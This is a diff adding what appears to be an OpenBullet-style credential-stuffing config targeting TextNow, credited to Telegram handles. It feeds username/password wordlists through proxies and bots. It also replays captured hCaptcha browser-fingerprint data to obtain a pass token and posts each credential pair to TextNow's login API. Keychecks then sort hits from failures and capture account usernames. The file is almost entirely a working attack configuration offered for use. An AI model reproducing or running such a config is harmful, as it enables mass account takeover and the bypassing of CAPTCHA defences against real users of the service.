@@ -1,0 +1,132 @@
+[SETTINGS]
+{
+  "Name": "Textnow",
+  "SuggestedBots": 140,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-16T20:13:18.1740225+03:30",
+  "AdditionalInfo": "Telegram :      |   →[@PremiumFather]] [[@Father_Bin]] Telegram Channel   |",
+  "Author": "     |   →[@PremiumFather]] [[@Father_Bin]] Telegram Channel   |",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Option REQUEST OPTIONS "https://hcaptcha.com/checksiteconfig?host=www.textnow.com&sitekey=757a3cda-5bdd-42fe-87c9-d4b0eaad2312&sc=1&swa=1" 
+  
+  HEADER "Host: hcaptcha.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Access-Control-Request-Method: GET" 
+  HEADER "Access-Control-Request-Headers: cache-control,content-type" 
+  HEADER "Origin: https://assets.hcaptcha.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://assets.hcaptcha.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#GET REQUEST GET "https://hcaptcha.com/checksiteconfig?host=www.textnow.com&sitekey=757a3cda-5bdd-42fe-87c9-d4b0eaad2312&sc=1&swa=1" 
+  
+  HEADER "Host: hcaptcha.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://assets.hcaptcha.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://assets.hcaptcha.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#RE PARSE "<SOURCE>" JSON "req" -> VAR "RE" 
+
+#Post_(hcaptcha_) REQUEST POST "https://hcaptcha.com/getcaptcha" 
+  CONTENT "sitekey=757a3cda-5bdd-42fe-87c9-d4b0eaad2312&host=www.textnow.com&hl=en&motionData=%7B%22topLevel%22%3A%7B%22st%22%3A1602801567414%2C%22sc%22%3A%7B%22availWidth%22%3A1596%2C%22availHeight%22%3A1052%2C%22width%22%3A1596%2C%22height%22%3A1092%2C%22colorDepth%22%3A24%2C%22pixelDepth%22%3A24%2C%22availLeft%22%3A0%2C%22availTop%22%3A0%7D%2C%22nv%22%3A%7B%22vendorSub%22%3A%22%22%2C%22productSub%22%3A%2220030107%22%2C%22vendor%22%3A%22Google%20Inc.%22%2C%22maxTouchPoints%22%3A10%2C%22userActivation%22%3A%7B%7D%2C%22doNotTrack%22%3Anull%2C%22geolocation%22%3A%7B%7D%2C%22connection%22%3A%7B%7D%2C%22webkitTemporaryStorage%22%3A%7B%7D%2C%22webkitPersistentStorage%22%3A%7B%7D%2C%22hardwareConcurrency%22%3A1%2C%22cookieEnabled%22%3Atrue%2C%22appCodeName%22%3A%22Mozilla%22%2C%22appName%22%3A%22Netscape%22%2C%22appVersion%22%3A%225.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F86.0.4240.75%20Safari%2F537.36%22%2C%22platform%22%3A%22Win32%22%2C%22product%22%3A%22Gecko%22%2C%22userAgent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F86.0.4240.75%20Safari%2F537.36%22%2C%22language%22%3A%22en-US%22%2C%22languages%22%3A%5B%22en-US%22%2C%22en%22%5D%2C%22onLine%22%3Atrue%2C%22xr%22%3A%7B%7D%2C%22mediaCapabilities%22%3A%7B%7D%2C%22permissions%22%3A%7B%7D%2C%22locks%22%3A%7B%7D%2C%22wakeLock%22%3A%7B%7D%2C%22usb%22%3A%7B%7D%2C%22mediaSession%22%3A%7B%7D%2C%22clipboard%22%3A%7B%7D%2C%22credentials%22%3A%7B%7D%2C%22keyboard%22%3A%7B%7D%2C%22mediaDevices%22%3A%7B%7D%2C%22storage%22%3A%7B%7D%2C%22serviceWorker%22%3A%7B%7D%2C%22deviceMemory%22%3A1%2C%22presentation%22%3A%7B%7D%2C%22bluetooth%22%3A%7B%7D%2C%22plugins%22%3A%5B%22internal-pdf-viewer%22%2C%22mhjfbmdgcfjbbpaeojofohoefgiehjai%22%2C%22internal-nacl-plugin%22%5D%7D%2C%22dr%22%3A%22%22%2C%22wn%22%3A%5B%5B1579%2C981%2C1%2C1602801567418%5D%5D%2C%22xy%22%3A%5B%5B0%2C0%2C0.9893483709273183%2C1602801567418%5D%5D%2C%22mm%22%3A%5B%5B771%2C278%2C1602801568794%5D%2C%5B771%2C277%2C1602801568894%5D%2C%5B771%2C276%2C1602801569868%5D%2C%5B771%2C274%2C1602801569944%5D%2C%5B769%2C272%2C1602801570338%5D%2C%5B762%2C310%2C1602801570652%5D%2C%5B765%2C371%2C1602801570696%5D%2C%5B766%2C375%2C1602801570764%5D%2C%5B793%2C379%2C1602801570908%5D%2C%5B842%2C386%2C1602801570966%5D%2C%5B868%2C389%2C1602801571021%5D%2C%5B879%2C389%2C1602801571107%5D%2C%5B881%2C389%2C1602801571270%5D%2C%5B995%2C389%2C1602801572471%5D%2C%5B1039%2C386%2C1602801572509%5D%2C%5B1078%2C384%2C1602801572562%5D%2C%5B1088%2C384%2C1602801572728%5D%2C%5B1090%2C384%2C1602801573327%5D%2C%5B1092%2C386%2C1602801573398%5D%2C%5B1094%2C385%2C1602801573454%5D%2C%5B1090%2C385%2C1602801573720%5D%2C%5B1090%2C383%2C1602801574544%5D%2C%5B1090%2C380%2C1602801574574%5D%2C%5B1091%2C375%2C1602801574879%5D%2C%5B1092%2C374%2C1602801574993%5D%2C%5B1106%2C370%2C1602801575006%5D%2C%5B1108%2C361%2C1602801575171%5D%2C%5B1108%2C362%2C1602801575568%5D%2C%5B1062%2C403%2C1602801575779%5D%2C%5B841%2C552%2C1602801575905%5D%2C%5B416%2C856%2C1602801576292%5D%2C%5B376%2C905%2C1602801576311%5D%2C%5B298%2C972%2C1602801576451%5D%2C%5B301%2C972%2C1602801576669%5D%2C%5B313%2C975%2C1602801577076%5D%2C%5B316%2C977%2C1602801577091%5D%5D%2C%22md%22%3A%5B%5B881%2C389%2C1602801571975%5D%5D%2C%22mu%22%3A%5B%5B881%2C389%2C1602801572236%5D%5D%7D%2C%22session%22%3A%5B%5D%2C%22widgetList%22%3A%5B%220drk98gr6qmh%22%5D%2C%22widgetId%22%3A%220drk98gr6qmh%22%2C%22href%22%3A%22https%3A%2F%2Fwww.textnow.com%2Flogin%22%7D&n=7f30d903832a26afbf282426f7edc93193566bf3888e9649cb5e33faf43ad78310644eca3853ef21fb2cdc09bf6eac98630097b38f19873d656df72a49f2aa8940604ab3f35085e231937cf54f770b5da3ec6a63884f5aed024cb3a1ee604a558d6ec14f638aac8a8541b9f58b7a55352cbd67bef34a82ecb4ed6cfc14d95ca367f3c0ca1ec89da9dcd72a9d1ae83800a62bfd8c8fe1f3494fd14bf1113a88721941a9743fa2767fd8a8e940147f728cf1e1fc0eec5f7a65b9f2ccfe416b6eaf7c20723e4ce116352896cd2264252a9602e526437ec146903508d950dd7e58a85a15b5fb41b88f78381440299f8ae473f4349b8505fa5a95f3282fbbf0bdad8e38cbabe35cc47a8495f199da63434a38caa27f36a5cfc6707994167b4e3916ca4c428ec012206e607d56cb0c4dd145bedfc25947493b5a06f61caa228d70986ea388043f93ad4e5f2f95b8b4e017aff681575cd352fa20ecc1d390f3ce11981b3209272fd1f8580f03b67ed6d5e54bdc616c81efe4a3a8dbce4ac8cb09c644d1f32002a29c8dd0145c7e06b8018ebe913f6c31467796d05a12ecf324501037f8222521a127920880e3bc612c036025099700a3c9a44e2f853252800c4e67be2c68579e172a750ccef9976323930a3b68d41e60f0dd465c7187545a4fbd88dd9c00&c=%7B%22type%22%3A%22hsw%22%2C%22req%22%3A%22<RE>%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: hcaptcha.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Content-type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://assets.hcaptcha.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://assets.hcaptcha.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#A PARSE "<SOURCE>" JSON "generated_pass_UUID" -> VAR "A" 
+
+#Post_(_textnow_) REQUEST POST "https://www.textnow.com/api/sessions" 
+  CONTENT "{\"json\":\"{\\\"remember\\\":true,\\\"username\\\":\\\"<USER>\\\",\\\"password\\\":\\\"<PASS>\\\"}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.textnow.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "X-CSRF-TOKEN: X3kDHZGl-oF-p5UYwF07s3Bevb8kWRPCL5p4" 
+  HEADER "Content-Type: application/json;charset=utf-8" 
+  HEADER "X-TN-hCaptcha: <A>" 
+  HEADER "X-XSRF-TOKEN: F0FmmhhH-G8_pHQ-eKBeONnLLHwH9KEZuNM4" 
+  HEADER "Origin: https://www.textnow.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.textnow.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 77" 
+
+#KEY KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User Not Found" 
+    KEY "{\"result\":\"Invalid Credentials\",\"error_code\":\"INVALID_PASSWORD\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"id\":\"" 
+    KEY "\"username\":\"" 
+
+#User PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "User" 
+
+FUNCTION Constant "     |   →[@PremiumFather]] [[@Father_Bin]] Telegram Channel   |" -> VAR "| Config By :" 
+
